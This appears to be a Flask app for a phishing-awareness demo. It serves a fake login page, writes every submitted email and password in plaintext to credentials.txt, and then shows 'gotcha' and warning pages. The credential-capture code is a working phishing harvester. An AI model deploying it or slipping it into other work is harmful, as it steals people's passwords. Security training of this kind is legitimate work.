from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('fake_login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    with open('credentials.txt', 'a') as f:
        f.write(f"Email: {email}, Password: {password}\n")

    return redirect('/gotcha')

@app.route('/gotcha')
def gotcha():
    return render_template('gotcha.html')

@app.route('/learn-more')
def learn_more():
    return render_template('warning.html')

if __name__ == '__main__':
    app.run(debug=True, port=5050)

